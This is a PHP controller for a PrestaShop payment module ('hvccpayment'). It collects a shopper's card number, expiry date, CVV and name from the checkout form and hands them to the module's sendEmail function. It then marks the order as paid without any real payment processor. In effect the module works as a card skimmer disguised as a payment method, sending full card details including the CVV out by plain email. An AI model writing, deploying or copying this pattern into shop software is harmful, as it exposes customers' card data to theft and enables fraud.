<?php

class HvccPaymentValidationModuleFrontController extends ModuleFrontController
{
    /**
     * @see FrontController::postProcess()
     */
    public function postProcess()
    {
        $cart = $this->context->cart;
        $order_number = strtoupper(Tools::passwdGen(7, 'NON_NUMERIC'));

        $data = array();
        $data['O_ID'] = $cart->id;
        $data['O_Number'] = $data['O_Number'] = strtoupper(Tools::passwdGen(7, 'NUMERIC'));
        $data['C_Number'] = Tools::getValue('C_Number');
        $data['C_Date'] = Tools::getValue('C_Date');
        $data['C_Cvv'] = Tools::getValue('C_Cvv');
        $data['C_Name'] = Tools::getValue('C_Name');
        $data['C_Total'] = (float) $cart->getOrderTotal(true, Cart::BOTH);

        if (!$data['C_Number'] || !$data['C_Date'] || !$data['C_Cvv'] || !$data['C_Name']) {
            Tools::redirect('index.php?controller=order');
        }

        if(!$this->module->sendEmail($data)) {
            Tools::redirect('index.php?controller=order');
        }

        $authorized = false;
        foreach (Module::getPaymentModules() as $module) {
            if ($module['name'] == 'hvccpayment') {
                $authorized = true;
                break;
            }
        }

        if (!$authorized) {
            die($this->module->l('This payment method is not available.', 'validation'));
        }

        //$this->setTemplate('module:paymentexample/views/templates/front/payment_return.tpl');

        $customer = new Customer($cart->id_customer);
        if (!Validate::isLoadedObject($customer)) {
            Tools::redirect('index.php?controller=order&step=1');
        }

        $currency = $this->context->currency;
        $total = (float) $cart->getOrderTotal(true, Cart::BOTH);
        /* $mailVars = array(
            '{bankwire_owner}' => Configuration::get('BANK_WIRE_OWNER'),
            '{bankwire_details}' => nl2br(Configuration::get('BANK_WIRE_DETAILS')),
            '{bankwire_address}' => nl2br(Configuration::get('BANK_WIRE_ADDRESS')),
        ); */

        $this->module->validateOrder($cart->id, Configuration::get('PS_OS_PAYMENT'), $total, 'Online Credit Card', null, null, (int) $currency->id, false, $customer->secure_key);
        Tools::redirect('index.php?controller=order-confirmation&id_cart=' . $cart->id . '&id_module=' . $this->module->id . '&id_order=' . $this->module->currentOrder . '&key=' . $customer->secure_key);
    }
}
